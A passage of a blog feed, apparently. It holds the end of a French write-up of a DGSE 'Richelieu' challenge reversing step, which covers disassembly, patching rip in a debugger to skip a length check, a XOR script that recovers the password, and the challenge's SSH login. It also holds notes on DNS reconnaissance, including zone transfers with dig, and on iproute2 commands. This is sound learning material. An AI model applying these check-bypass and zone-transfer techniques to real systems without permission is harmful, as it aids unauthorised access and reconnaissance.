|   ..----&amp;gt; 0x00400af0      410fb6c0       movzx eax, r8b
|   ::|:|   0x00400af4      0fb632         movzx esi, byte [rdx]
|   ::|:|   0x00400af7      0fb60f         movzx ecx, byte [rdi]
|   ::|:|   0x00400afa      4883c201       add rdx, 1
|   ::|:|   0x00400afe      4883c701       add rdi, 1
|   ::|:|   0x00400b02      84c9           test cl, cl
|  ,======&amp;lt; 0x00400b04      7411           je 0x400b17
|  |::|:|   ; CODE XREF from sub.w0c__:_aae (0x400aee)
|  |::`---&amp;gt; 0x00400b06      4589c8         mov r8d, r9d
|  |:: :|   0x00400b09      85c0           test eax, eax
|  |`=====&amp;lt; 0x00400b0b      74e3           je 0x400af0
|  | : :|   0x00400b0d      31f1           xor ecx, esi
|  | : :|   0x00400b0f      3a0a           cmp cl, byte [rdx]
|  | : :|   0x00400b11      410f94c0       sete r8b
|  | `====&amp;lt; 0x00400b15      ebd9           jmp 0x400af0
|  `------&amp;gt; 0x00400b17      f3c3           ret
|      :|   ; CODE XREF from sub.w0c__:_aae (0x400ad1)
|      :`-&amp;gt; 0x00400b19      b801000000     mov eax, 1
\      `==&amp;lt; 0x00400b1e      ebaa           jmp 0x400aca
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;0x00400aae      4889fe         mov rsi, rdi
0x00400ab1      b800000000     mov eax, 0
0x00400ab6      48c7c1ffffff.  mov rcx, -1
0x00400abd      f2ae           repne scasb al, byte [rdi]
0x00400abf      b800000000     mov eax, 0
0x00400ac4      4883f9e0       cmp rcx, -0x20
0x00400ac8      7402           je 0x400acc
0x00400aca      f3c3           ret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Les premières instructions servent sûrement à gérer l’argument de la fonction (qui est notre mot de passe). Après cela, on compare &lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt; à &lt;code class=&quot;highlighter-rouge&quot;&gt;0x20&lt;/code&gt;. Si cette comparaison et vraie, alors on continue le l’exécution (on évite le &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt;). Sinon on va sur le &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt; qui va nous faire quitter la fonction avec un &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt; à 0, ce qui va nous afficher &lt;code class=&quot;highlighter-rouge&quot;&gt;Mauvais mot de passe&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Pour faire simple, le &lt;code class=&quot;highlighter-rouge&quot;&gt;cmp rcx, -0x20&lt;/code&gt; va s’assurer que le &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; fourni au programme va avoir une taille de 32 caractères.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-0x20&lt;/code&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cmp rcx, -0x20&lt;/code&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AAAA&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0xfffffffffffffffa&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffffffffffffdf&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;NOT EQUAL&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AAAAAA&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0xfffffffffffffff8&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffffffffffffdf&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;NOT EQUAL&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt;*32&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffffffffffffdf&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffffffffffffdf&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;EQUAL&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Nous devons donc avoir un &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; de taille 0x20, soit 32 caractères pour respecter cette condition.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ood AAAA
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; db 0x00400ac8
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dc
hit breakpoint at: 400ac8
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dr rip
0x00400ac8
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dr &lt;span class=&quot;nv&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00400acc
0x00400ac8 -&amp;gt;0x00400acc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Normalement, nous devons fournir un argument de taille 32 octets, mais nous allons juste donner &lt;code class=&quot;highlighter-rouge&quot;&gt;ABCD&lt;/code&gt; au programme, placer un breakpoint sur &lt;code class=&quot;highlighter-rouge&quot;&gt;je 0x400acc&lt;/code&gt; afin de modifier la valeur de &lt;code class=&quot;highlighter-rouge&quot;&gt;rip&lt;/code&gt; pour passer outre la condition des 32 caractères.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;0x00400acc      0fb60e         movzx ecx, byte [rsi]
0x00400acf      84c9           test cl, cl
0x00400ad1      7446           je 0x400b19
0x00400ad3      488d15e68d08.  lea rdx, qword str.w0c__:   ; 0x4898c0 ; &quot;w0c&amp;amp;]:\x0e;\rM*\x1f.\x1f-O(Q7z\x14v x\x0f!M!l\x11&quot;
0x00400ada      488d7e01       lea rdi, qword [rsi + 1]
0x00400ade      b801000000     mov eax, 1
0x00400ae3      be33000000     mov esi, 0x33               ; '3' ; 51
0x00400ae8      41b900000000   mov r9d, 0
0x00400aee      eb16           jmp 0x400b06
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dans ce bloc on peut remarquer que l’on va manipuler la chaîne &lt;code class=&quot;highlighter-rouge&quot;&gt;w0c&amp;amp;]:\x0e;\rM*\x1f.\x1f-O(Q7z\x14v x\x0f!M!l\x11&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;0x00400af0      410fb6c0       movzx eax, r8b
0x00400af4      0fb632         movzx esi, byte [rdx]
0x00400af7      0fb60f         movzx ecx, byte [rdi]
0x00400afa      4883c201       add rdx, 1
0x00400afe      4883c701       add rdi, 1
0x00400b02      84c9           test cl, cl
0x00400b04      7411           je 0x400b17
0x00400b06      4589c8         mov r8d, r9d
0x00400b09      85c0           test eax, eax
0x00400b0b      74e3           je 0x400af0
0x00400b0d      31f1           xor ecx, esi
0x00400b0f      3a0a           cmp cl, byte [rdx]
0x00400b11      410f94c0       sete r8b
0x00400b15      ebd9           jmp 0x400af0
0x00400b17      f3c3           ret
0x00400b19      b801000000     mov eax, 1
0x00400b1e      ebaa           jmp 0x400aca
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dans la suite on observe une ligne intéressante &lt;code class=&quot;highlighter-rouge&quot;&gt;xor ecx, esi&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;0x00400b0d      31f1           xor ecx, esi
0x00400b0f      3a0a           cmp cl, byte [rdx]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On réalise un &lt;strong&gt;XOR&lt;/strong&gt; puis un comparaison, c’est sûrement une partie importante du prgramme. Pour ce xor on utilise &lt;code class=&quot;highlighter-rouge&quot;&gt;ecx&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;esi&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;0x00400af4      0fb632         movzx esi, byte [rdx]
0x00400af7      0fb60f         movzx ecx, byte [rdi]
0x00400afa      4883c201       add rdx, 1
0x00400afe      4883c701       add rdi, 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Après pas mal de debug sur le programme sur les instructions importantes, on comprend comment fonctionne la vérification du mot de passe.&lt;/p&gt;

&lt;p&gt;On peut retrouver ce dernier avec le script suivant :&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'3w0c&amp;amp;]:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;M*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x1f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x1f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-O(Q7z&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x14&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;v x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!M!l&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x11&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# DGSE{g456@g5112bgyfMnbVXw.llM}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;zip-1&quot;&gt;ZIP&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; suite_files/ &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DGSE{g456@g5112bgyfMnbVXw.llM}&quot;&lt;/span&gt; suite.zip 
Archive:  suite.zip
  inflating: suite_files/suite.txt

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;suite_files/suite.txt 
Suite &lt;span class=&quot;nb&quot;&gt;du &lt;/span&gt;challenge Richelieu :

ssh defi1.challengecybersec.fr &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; defi1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2222

mot de passe : DGSE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;2f77c517b06f1cd1ce864f79f41f25ca8874413c8c1204f7ec9c6728c87f270a&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;C’est ici que le challenge se termine pour moi.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>dns</title>
   <link href="http://localhost:4000/other/2019/06/04/dns/"/>
   <updated>2019-06-04T00:00:00+02:00</updated>
   <id>http://localhost:4000/other/2019/06/04/dns</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;whois&quot;&gt;whois&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Whois records are used to get details provided by the domain owner to domain registrar. Whois serves are operated by Regional Internet Registrars (RIR) and use port &lt;strong&gt;43&lt;/strong&gt;. In Linux we can use the command &lt;code class=&quot;highlighter-rouge&quot;&gt;whois&lt;/code&gt;. We can use DNS to find services, like mails, or subdomaines.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whois orange.fr
registrar:   ORANGE
&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:        Isp Option 1
address:     78 Rue Olivier de Serres
address:     78-84
address:     75015 PARIS 15
country:     FR
phone:       +33 1 53 95 12 28
e-mail:      domaine.admin@orange.com
website:     https://cloud.orange-business.com/fr/e-boutique/noms-de-domaine
anonymous:   NO
registered:  2006-02-15T12:00:00Z
&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt;:      FRNIC

nic-hdl:     O7771-FRNIC
&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:        ORGANIZATION
contact:     ORANGE
address:     ORANGE
address:     78-84, rue Olivier de Serres
address:     75015 Paris
country:     FR
phone:       +33 1 44 44 22 22
fax-no:      +33 1 45 30 52 71
e-mail:      gestionndd@francetelecom.biz
registrar:   ORANGE
changed:     2018-02-21T08:11:58Z nic@nic.fr
anonymous:   NO
obsoleted:   NO
eligstatus:  not identified
reachstatus: not identified
&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt;:      FRNIC
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;zone-transfer-using-dig&quot;&gt;Zone transfer using dig&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;To create replication of DNS server, we use &lt;strong&gt;zone transfer&lt;/strong&gt; to synchronize the data. A zone transfer request is a copu of the database with IP-hostname that it can resolve. A misconfiguration in DNS servers allow for anyone to ask for a zone transfer and obtain the full database with the &lt;code class=&quot;highlighter-rouge&quot;&gt;dig&lt;/code&gt; (Domain Internet Groper) command. Zone transfer use TCP port 53 and not UDP port 53 (standard). Exists many types of DNS records, like Mail Exchanger (MX), SRV, PTR.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig google.fr mx
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; ANSWER SECTION:
google.fr.              582     IN      MX      50 alt4.aspmx.l.google.com.
google.fr.              582     IN      MX      40 alt3.aspmx.l.google.com.
google.fr.              582     IN      MX      10 aspmx.l.google.com.
google.fr.              582     IN      MX      30 alt2.aspmx.l.google.com.
google.fr.              582     IN      MX      20 alt1.aspmx.l.google.com.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# make zone transfer request&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig axfr zonetransfer.me @nsztm1.digi.ninja
&lt;span class=&quot;c&quot;&gt;# axfr: zone transfer from zonetransfer.me domain to nsztm1.digi.ninja server&lt;/span&gt;
zonetransfer.me.        7200    IN      SOA     nsztm1.digi.ninja. robin.digi.ninja. 2017042001 172800 900 1209600 3600                                                             
zonetransfer.me.        300     IN      HINFO   &lt;span class=&quot;s2&quot;&gt;&quot;Casio fx-700G&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Windows XP&quot;&lt;/span&gt;
zonetransfer.me.        301     IN      TXT     &lt;span class=&quot;s2&quot;&gt;&quot;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA&quot;&lt;/span&gt;
zonetransfer.me.        7200    IN      MX      0 ASPMX.L.GOOGLE.COM.
zonetransfer.me.        7200    IN      MX      10 ALT1.ASPMX.L.GOOGLE.COM.
zonetransfer.me.        7200    IN      MX      10 ALT2.ASPMX.L.GOOGLE.COM.
zonetransfer.me.        7200    IN      MX      20 ASPMX2.GOOGLEMAIL.COM.
zonetransfer.me.        7200    IN      MX      20 ASPMX3.GOOGLEMAIL.COM.
zonetransfer.me.        7200    IN      MX      20 ASPMX4.GOOGLEMAIL.COM.
zonetransfer.me.        7200    IN      MX      20 ASPMX5.GOOGLEMAIL.COM.
zonetransfer.me.        7200    IN      A       5.196.105.14
zonetransfer.me.        7200    IN      NS      nsztm1.digi.ninja.
zonetransfer.me.        7200    IN      NS      nsztm2.digi.ninja.
_sip._tcp.zonetransfer.me. 14000 IN     SRV     0 0 5060 www.zonetransfer.me.
14.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200 IN PTR www.zonetransfer.me.
asfdbauthdns.zonetransfer.me. 7900 IN   AFSDB   1 asfdbbox.zonetransfer.me.
asfdbbox.zonetransfer.me. 7200  IN      A       127.0.0.1
asfdbvolume.zonetransfer.me. 7800 IN    AFSDB   1 asfdbbox.zonetransfer.me.
canberra-office.zonetransfer.me. 7200 IN A      202.14.81.230
cmdexec.zonetransfer.me. 300    IN      TXT     &lt;span class=&quot;s2&quot;&gt;&quot;; ls&quot;&lt;/span&gt;
contact.zonetransfer.me. 2592000 IN     TXT     &lt;span class=&quot;s2&quot;&gt;&quot;Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes&quot;&lt;/span&gt;                              
dc-office.zonetransfer.me. 7200 IN      A       143.228.181.132
deadbeef.zonetransfer.me. 7201  IN      AAAA    dead:beaf::
dr.zonetransfer.me.     300     IN      LOC     53 20 56.558 N 1 38 33.526 W 0.00m 1m 10000m 10m
DZC.zonetransfer.me.    7200    IN      TXT     &lt;span class=&quot;s2&quot;&gt;&quot;AbCdEfG&quot;&lt;/span&gt;
email.zonetransfer.me.  2222    IN      NAPTR   1 1 &lt;span class=&quot;s2&quot;&gt;&quot;P&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;E2U+email&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; email.zonetransfer.me.zonetransfer.me.
email.zonetransfer.me.  7200    IN      A       74.125.206.26
home.zonetransfer.me.   7200    IN      A       127.0.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# locked transfer&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig axfr facebook.com @nsztm1.digi.ninja
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer failed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sometimes, the primary DNS server block the zone transfer, and a secondary server will allow it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# all nameservers of a domain&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig google.com NS +noall +answer
google.com.             16907   IN      NS      ns2.google.com.
google.com.             16907   IN      NS      ns3.google.com.
google.com.             16907   IN      NS      ns1.google.com.
google.com. 						16907   IN      NS      ns4.google.com.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>iproute2</title>
   <link href="http://localhost:4000/network/2019/03/02/iproute2/"/>
   <updated>2019-03-02T00:00:00+01:00</updated>
   <id>http://localhost:4000/network/2019/03/02/iproute2</id>
   <content type="html">&lt;!--more--&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ip&lt;/code&gt; is from &lt;code class=&quot;highlighter-rouge&quot;&gt;iproute2&lt;/code&gt; package.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;show-configuration&quot;&gt;show configuration&lt;/h2&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# addr&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip addr show
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip addr show eth0

&lt;span class=&quot;c&quot;&gt;# multicast addr&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip maddr

&lt;span class=&quot;c&quot;&gt;# link&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;show
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;show eth0

&lt;span class=&quot;c&quot;&gt;# other link info&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ethtool eth0

&lt;span class=&quot;c&quot;&gt;# route&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip route show

&lt;span class=&quot;c&quot;&gt;# neighbors&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip neighbor

&lt;span class=&quot;c&quot;&gt;# multicast group of host&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip maddress show

&lt;span class=&quot;c&quot;&gt;# windows&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arp &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ipconfig
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;route print
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;configure&quot;&gt;configure&lt;/h2&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# clean interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip addr flush dev eth0

&lt;span class=&quot;c&quot;&gt;# addr&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip addr add 172.16.0.1/24 dev eth0

&lt;span class=&quot;c&quot;&gt;# up/down interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth0 up
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth0 down

&lt;span class=&quot;c&quot;&gt;# route&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip route add default via 192.168.0.254
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip route add 10.0.0.0/24 via 193.233.7.65

&lt;span class=&quot;c&quot;&gt;# promiscuous mode: pass all traffic to host rather&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# than filter on destination address of NIC&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth0 promisc on

&lt;span class=&quot;c&quot;&gt;# mtu&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth0 mtu 1500
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;enable-routing-on-linux&quot;&gt;enable routing on Linux&lt;/h2&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# show&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sysctl net.ipv4.ip_forward

&lt;span class=&quot;c&quot;&gt;# edit&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sysctl net.ipv4.ip_forward&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1

&lt;span class=&quot;c&quot;&gt;# for persistent rules add this in /etc/sysctl.conf&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;net.ipv4.ip_forward &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1

&lt;span class=&quot;c&quot;&gt;# apply changes&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sysctl &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; /etc/sysctl.conf

&lt;span class=&quot;c&quot;&gt;# old method&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/sys/net/ipv4/ip_forward
